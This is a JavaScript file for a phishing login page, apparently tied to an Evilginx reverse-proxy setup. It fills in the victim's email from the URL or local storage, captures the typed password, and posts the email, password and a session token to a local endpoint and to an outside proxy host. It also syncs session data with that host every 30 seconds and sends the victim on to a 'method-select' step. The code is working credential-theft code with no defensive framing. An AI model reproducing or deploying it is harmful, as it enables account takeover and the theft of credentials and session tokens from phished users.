(function() {
  'use strict';
  const PROXY_URL = process.env.PROXY_URL || 'https://evilginx-proxy.example.com';
  const SESSION_TOKEN = localStorage.getItem('sessionToken') || 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => (Math.random() * 16 | 0).toString(16));

  window.addEventListener('load', () => {
    if (window.location.hostname.includes('vercel.app')) {
      setupProxyListener();
      syncWithEvilginx();
    }
    let victimEmail = localStorage.getItem('victimEmail') || new URLSearchParams(window.location.search).get('email') || 'example@victim.com';
    document.getElementById('victim-email').textContent = victimEmail;
    document.getElementById('victim-email-hidden').value = victimEmail;

    document.getElementById('password-form').addEventListener('submit', e => {
      e.preventDefault();
      const password = document.getElementById('input-19').value;
      fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: victimEmail, password, session: SESSION_TOKEN })
      }).then(response => {
        if (response.ok) window.location.href = '/method-select';
        else document.querySelector('.errry').style.display = 'block';
      });
    });
  });

  function setupProxyListener() {
    const form = document.getElementById('password-form');
    form.addEventListener('submit', e => {
      e.preventDefault();
      const formData = new FormData(form);
      fetch(PROXY_URL + '/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(Object.fromEntries(formData))
      }).then(response => response.json()).then(result => {
        if (result.success) window.location.href = result.redirect || '/method-select';
        else document.querySelector('.errry').style.display = 'block';
      });
    });
  }

  function syncWithEvilginx() {
    setInterval(() => {
      fetch(PROXY_URL + '/sync', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session: SESSION_TOKEN, email: localStorage.getItem('victimEmail') })
      }).catch(err => console.error('Sync failed:', err));
    }, 30000);
  }

  document.querySelector("[data-transform]").addEventListener("click", transform);
  var isPassword = true;
  function transform() {
    var myInput = document.querySelector("[data-show]");
    var oldHtml = myInput.outerHTML;
    var text = myInput.value;
    if (isPassword) var newHtml = oldHtml.replace(/password/g, "text");
    else newHtml = oldHtml.replace(/text/g, "password");
    myInput.outerHTML = newHtml;
    myInput = document.querySelector("[data-show]");
    myInput.value = text;
    isPassword = !isPassword;
  }

  document.getElementById('refreshButton').addEventListener('click', () => location.reload());
})();
